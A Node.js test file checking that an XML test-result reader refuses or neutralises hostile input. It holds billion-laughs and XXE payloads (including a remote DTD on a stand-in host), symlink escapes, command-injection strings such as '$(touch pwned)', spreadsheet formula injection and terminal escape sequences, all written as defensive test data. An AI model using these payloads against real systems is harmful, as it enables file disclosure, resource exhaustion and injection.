import { test } from 'node:test';
import assert from 'node:assert/strict';
import { mkdir, symlink, writeFile } from 'node:fs/promises';
import { resolve } from 'node:path';
import { LIMITS, XmlError, decodeReferences, isBinary, main, parseXml, readRuns, toCsv, toMarkdown, toText } from '../src/index.js';
import { check, find, problems, run, suite, withFiles } from './helpers.js';

// Hostile input: a result file that tries to expand entities, fetch an external entity, exhaust the memory or the
// time, lead the tool out of the folder or round in a loop, rewrite the terminal, break a table or change how objects
// behave. Each test also checks the time, because work that grows faster than the input is a failure even when the
// answer is right.

const LIMIT = { timeout: 60000 };
const fast = async (fn, ms = 5000) => {
  const start = Date.now();
  const result = await fn();
  assert.ok(Date.now() - start < ms, `took ${Date.now() - start} ms`);
  return result;
};
const refused = (text, pattern) => assert.throws(() => parseXml(text), (e) => e instanceof XmlError && pattern.test(e.reason));

test('hostile: the billion laughs never expand; the file is refused at its DOCTYPE, at once', LIMIT, async () => {
  const lol = ['<?xml version="1.0"?>', '<!DOCTYPE lolz [', '<!ENTITY lol "lol">'];
  for (let i = 1; i < 10; i += 1) lol.push(`<!ENTITY lol${i} "${`&lol${i === 1 ? '' : i - 1};`.repeat(10)}">`);
  lol.push(']>', '<testsuite name="s"><testcase name="&lol9;"/></testsuite>');
  const text = lol.join('\n');
  await fast(() => refused(text, /the file has a DOCTYPE/), 500);
  const r = await fast(() => check([{ 'lol.xml': text }]));
  assert.deepEqual(problems(r), ['empty-run']);
  assert.match(r.unreadable[0].reason, /^line 2, column 1: the file has a DOCTYPE/);
  assert.ok(JSON.stringify(r).length < 20000, 'the report stays small');
});

test('hostile: an external entity is never fetched or read, with or without a DOCTYPE', LIMIT, async () => {
  const secret = 'TOP-SECRET-CONTENT';
  await withFiles({ 'secret.txt': secret }, async (dir) => {
    const target = resolve(dir, 'secret.txt').split('\\').join('/');
    const xxe = `<?xml version="1.0"?>\n<!DOCTYPE testsuite [<!ENTITY xxe SYSTEM "file://${target}">]>\n<testsuite name="s"><testcase name="&xxe;"/></testsuite>`;
    const param = '<!DOCTYPE x [<!ENTITY % remote SYSTEM "https://example.test/evil.dtd"> %remote;]><testsuite/>';
    await writeFile(resolve(dir, 'r1.xml'), xxe);
    await writeFile(resolve(dir, 'r2.xml'), param);
    await writeFile(resolve(dir, 'r3.xml'), '<testsuite name="s"><testcase name="&xxe;"/></testsuite>');
    for (const format of ['text', 'json', 'markdown', 'csv']) {
      let out = '';
      const code = await main(['r1.xml', 'r2.xml', 'r3.xml', '--format', format], { out: (t) => { out += t; }, err: () => {} }, undefined, dir);
      assert.equal(code, 1, 'every run is empty, and an empty run fails');
      assert.ok(!out.includes(secret), format);
    }
  });
  refused('<testsuite><testcase name="&xxe;"/></testsuite>', /the entity reference &xxe; is not read/);
});

test('hostile: references decode once and never grow: a hundred thousand of them read in one pass', LIMIT, async () => {
  assert.equal(decodeReferences('&amp;amp;amp;'), '&amp;amp;');
  const many = '&#x41;'.repeat(100000);
  assert.equal((await fast(() => decodeReferences(many))).length, 100000);
  const doc = await fast(() => parseXml(`<a v="${'&amp;'.repeat(100000)}">${'&lt;'.repeat(100000)}</a>`));
  assert.equal(doc.root.attrs.get('v').length, 100000);
});

test('hostile: elements nested a hundred thousand deep are refused at 256 levels, in one pass', LIMIT, async () => {
  const deep = `<testsuites>${'<testsuite name="s">'.repeat(100000)}${'</testsuite>'.repeat(100000)}</testsuites>`;
  await fast(() => refused(deep, /elements nested more than 256 deep/));
  const ok = `<testsuites>${'<testsuite name="s">'.repeat(200)}<testcase name="t"/>${'</testsuite>'.repeat(200)}</testsuites>`;
  const r = await fast(() => check([{ 'a.xml': ok }]));
  assert.equal(r.totals.tests, 1);
  assert.equal(r.totals.read, 1);
});

test('hostile: more elements or attributes than the limits are refused; a long name is refused', LIMIT, async () => {
  await fast(() => assert.throws(() => parseXml(`<a>${'<b/>'.repeat(20)}</a>`, { maxElements: 10 }), /more than 10 elements/));
  const attrs = Array.from({ length: 3000 }, (_, i) => `a${i}="x"`).join(' ');
  await fast(() => refused(`<a ${attrs}/>`, /more than 256 attributes on <a>/));
  refused(`<${'n'.repeat(300)}/>`, /a name longer than 256 characters/);
});

test('hostile: tags, quotes, comments and CDATA that never end, and long runs of < and &, run in one pass', LIMIT, async () => {
  for (const text of [`<a v="${'x'.repeat(300000)}`, `<a><!--${'-'.repeat(300000)}`, `<a><![CDATA[${']'.repeat(300000)}`, `<a><?pi ${'?'.repeat(300000)}`, `${'<'.repeat(200000)}`, `<a>${'&'.repeat(200000)}</a>`, `<a>${'<b'.repeat(100000)}`, `${'</a>'.repeat(100000)}`, `<a>${'<!x'.repeat(100000)}</a>`]) {
    await fast(() => assert.throws(() => parseXml(text), XmlError), 3000);
  }
});

test('hostile: a file over the size limit is not read and is named in a note; the limits of the input refuse it with exit code 2', LIMIT, async () => {
  await withFiles({ 'r1/a.xml': suite([{ name: 'a' }]), 'r1/big.xml': suite([{ name: 'b', out: 'x'.repeat(3000) }]) }, async (dir) => {
    let out = '';
    const code = await fast(() => main(['r1', '--format', 'json'], { out: (t) => { out += t; }, err: () => {} }, { ...LIMITS, maxFileBytes: 1024 }, dir));
    assert.equal(code, 0);
    const r = JSON.parse(out);
    assert.equal(r.totals.notRead, 1);
    assert.match(r.unreadable[0].reason, /bytes is over the 1,024 byte limit/);
  });
  await withFiles({ 'r/a/b/c/d/e.xml': 'x', 'r/f.xml': 'x', 'r/g.xml': 'x' }, async (dir) => {
    let err = '';
    const e = { out: () => {}, err: (t) => { err += t; } };
    assert.equal(await main(['r'], e, { ...LIMITS, maxEntries: 3 }, dir), 2);
    assert.match(err, /the runs hold more than 3 files and folders/);
    err = '';
    assert.equal(await main(['r'], e, { ...LIMITS, maxDepth: 2 }, dir), 2);
    assert.match(err, /has folders nested more than 2 deep/);
    err = '';
    assert.equal(await main(['r'], e, { ...LIMITS, maxXmlFiles: 2 }, dir), 2);
    assert.match(err, /more than 2 XML files/);
    err = '';
    assert.equal(await main(['r'], e, { ...LIMITS, maxTotalBytes: 2 }, dir), 2);
    assert.match(err, /the XML files to read hold more than 2 byte/);
    err = '';
    assert.equal(await main(['r', 'r/f.xml', 'r/g.xml'], e, { ...LIMITS, maxRuns: 2 }, dir), 2);
    assert.match(err, /more than 2 runs/);
  });
});

test('hostile: a binary file or a UTF-16 file with an .xml name is not read as XML', LIMIT, async () => {
  await withFiles({ 'r/b.xml': suite([{ name: 'a' }]) }, async (dir) => {
    await writeFile(resolve(dir, 'r/a.xml'), Buffer.from([0x3c, 0x00, 0x01, 0xff]));
    await writeFile(resolve(dir, 'r/c.xml'), Buffer.from([0xff, 0xfe, 0x3c, 0x00, 0x61, 0x00]));
    const [r] = await readRuns(['r'], dir);
    assert.equal(r.files.find((f) => f.file === 'r/a.xml').reason, 'holds binary data (a null byte)');
    assert.equal(r.files.find((f) => f.file === 'r/c.xml').reason, 'is UTF-16; only UTF-8 is read');
    assert.equal(isBinary(Buffer.from('<a/>')), false);
  });
});

test('hostile: tens of thousands of tests in several runs are lined up in time; thousands of findings of one kind are capped at 200', LIMIT, async () => {
  const n = 20000;
  const big = (result) => ({ 'a.xml': `<testsuite name="s">${Array.from({ length: n }, (_, i) => `<testcase name="t${i}" classname="c" time="0.01"${result === 'failed' ? '><failure message="m"/></testcase>' : '/>'}`).join('')}</testsuite>` });
  const r = await fast(() => check([big('failed'), big('failed'), big('failed')]), 15000);
  assert.equal(find(r, 'always-failing').length, 200);
  assert.equal(r.counts.error, n);
  assert.ok(r.notes.includes(`${(n - 200).toLocaleString('en-US')} more findings of always-failing are counted but not listed`));
});

test('hostile: control, direction and line separator characters in a file name, a test name or a message are cleaned in every format', LIMIT, () => {
  const bad = ['x', String.fromCharCode(27), '[31m', String.fromCharCode(0x202e), 'y', String.fromCharCode(0x2028), 'z', String.fromCharCode(0x85)].join('');
  const xmlBad = bad.replace(String.fromCharCode(27), '&#27;');
  const r = check([{ [`${bad}.xml`]: suite([{ name: xmlBad, classname: xmlBad, result: 'failed', message: xmlBad }]) }]);
  assert.ok(problems(r).includes('always-failing'));
  for (const o of [toText(r), toMarkdown(r), toCsv(r), JSON.stringify(r)]) {
    for (const code of [27, 0x202e, 0x2028, 0x85]) assert.ok(!o.includes(String.fromCharCode(code)), `character ${code}`);
  }
});

test('hostile: test and suite names such as __proto__, constructor and toString are only names', LIMIT, () => {
  const r = check([{ 'a.xml': suite([{ name: '__proto__', classname: 'constructor', result: 'failed' }, { name: 'toString', classname: '__proto__' }, { name: 'toString', classname: '__proto__' }], { name: 'hasOwnProperty', time: '1' }) }]);
  assert.equal({}.polluted, undefined);
  assert.equal(Object.getPrototypeOf({}), Object.prototype);
  assert.deepEqual(problems(r), ['always-failing', 'duplicate-test-name']);
  assert.match(find(r, 'slowest-suites')[0].message, /hasOwnProperty \(1 s\)/);
});

test('hostile: a test name that starts with = or holds a link or a tag cannot run in a spreadsheet or break a Markdown table', LIMIT, () => {
  const evil = '=HYPERLINK("x","y")|a<script>[click](https://evil.example.test)`x`';
  const r = check([{ 'a.xml': suite([{ name: evil, classname: '', result: 'failed' }]) }]);
  const md = toMarkdown(r);
  assert.ok(!md.includes('<script>'));
  assert.ok(!md.includes('[click]('));
  for (const row of md.split('\n').filter((l) => l.startsWith('| error |'))) assert.equal(row.replace(/\\\|/g, '').split('|').length, 10, row.slice(0, 80));
  assert.ok(!/(^|,)=HYPERLINK/m.test(toCsv(r)));
});

test('hostile: no test is ever run, whatever the file names: a script path in a result is only text', LIMIT, async () => {
  const marker = 'ran-a-test.txt';
  const text = suite([{ name: `require('fs').writeFileSync('${marker}', 'x')`, classname: 'process.exit(3)', out: '$(touch pwned)' }]);
  await withFiles({ 'r/a.xml': text }, async (dir) => {
    assert.equal(await main(['r'], { out: () => {}, err: () => {} }, undefined, dir), 0);
    const [r] = await readRuns(['r'], dir);
    assert.deepEqual(r.files.map((f) => f.file), ['r/a.xml']);
    assert.equal(r.otherFiles, 0, 'no file was written');
  });
});

test('hostile: an argument that is a URL, a very long path, or a path with control characters is refused cleanly', LIMIT, async () => {
  const url = await run({}, ['https://example.test/results.xml']);
  assert.equal(url.code, 2);
  assert.match(url.err, /never fetches a URL/);
  const long = await run({}, [`${'a'.repeat(5000)}.xml`]);
  assert.equal(long.code, 2);
  assert.ok(long.err.length < 8000);
  const control = await run({}, [`x${String.fromCharCode(27)}[31m.xml`]);
  assert.equal(control.code, 2);
  assert.ok(!control.err.includes(String.fromCharCode(27)));
});

test('hostile: a symbolic link to a folder outside, a link to a file, and a link loop are listed and never followed', LIMIT, async (t) => {
  if (process.platform === 'win32') {
    t.skip('creating a symbolic link needs a privilege on Windows');
    return;
  }
  await withFiles({ 'outside/secret.xml': suite([{ name: 'secret', result: 'failed' }]), 'run/a.xml': suite([{ name: 'a' }]) }, async (dir) => {
    await symlink(resolve(dir, 'outside'), resolve(dir, 'run/escape'));
    await mkdir(resolve(dir, 'run/more'));
    await symlink(resolve(dir, 'outside/secret.xml'), resolve(dir, 'run/more/linked.xml'));
    await symlink(resolve(dir, 'run'), resolve(dir, 'run/loop'));
    let out = '';
    const code = await fast(() => main(['run', '--format', 'json'], { out: (x) => { out += x; }, err: () => {} }, undefined, dir));
    assert.equal(code, 0, 'the failing test outside the folder was not read');
    const r = JSON.parse(out);
    assert.equal(r.totals.files, 1);
    assert.ok(r.notes.some((n) => /3 symbolic links were not followed: run\/escape, run\/loop and run\/more\/linked\.xml/.test(n)));
  });
});

test('hostile: a run folder or file named on the command line may itself be a link, because the person named it', LIMIT, async (t) => {
  if (process.platform === 'win32') {
    t.skip('creating a symbolic link needs a privilege on Windows');
    return;
  }
  await withFiles({ 'real/a.xml': suite([{ name: 'a' }]) }, async (dir) => {
    await symlink(resolve(dir, 'real'), resolve(dir, 'named'));
    await symlink(resolve(dir, 'real/a.xml'), resolve(dir, 'one.xml'));
    assert.equal(await main(['named', 'one.xml'], { out: () => {}, err: () => {} }, undefined, dir), 0);
  });
});

test('hostile: a device inside the folder is never opened', LIMIT, async (t) => {
  if (process.platform === 'win32') {
    t.skip('there is no device file to link to on Windows');
    return;
  }
  await withFiles({ 'run/a.xml': suite([{ name: 'a' }]) }, async (dir) => {
    await symlink('/dev/zero', resolve(dir, 'run/zero.xml'));
    let out = '';
    const code = await fast(() => main(['run', '--format', 'json'], { out: (x) => { out += x; }, err: () => {} }, undefined, dir));
    assert.equal(code, 0);
    assert.ok(JSON.parse(out).notes.some((n) => /1 symbolic link was not followed/.test(n)));
  });
});

test('hostile: a file name with control characters is cleaned in the report, where the system allows such a name', LIMIT, async (t) => {
  if (process.platform === 'win32') {
    t.skip('Windows does not allow a control character in a file name');
    return;
  }
  const name = `run/evil${String.fromCharCode(27)}[31m.xml`;
  let r;
  try {
    r = await run({ [name]: suite([{ name: 'a', result: 'failed' }]) }, ['run']);
  } catch (error) {
    if (!['EINVAL', 'EILSEQ', 'ENOENT', 'EPERM', 'EACCES'].includes(error.code)) throw error;
    t.skip(`this file system does not allow the name (${error.code})`);
    return;
  }
  assert.equal(r.code, 1);
  assert.ok(!r.out.includes(String.fromCharCode(27)));
});

test('hostile: a Windows path with backslashes in a test name or a file attribute is only text, on every system', LIMIT, () => {
  const r = check([{ 'a.xml': '<testsuite name="s"><testcase name="C:\\Users\\ann\\cart" classname="c" file="..\\..\\secret.xml" time="1"><failure message="m"/></testcase></testsuite>' }]);
  assert.equal(find(r, 'always-failing')[0].test, 'c > C:\\Users\\ann\\cart');
  assert.equal(find(r, 'always-failing')[0].file, 'results/run-1/a.xml');
});
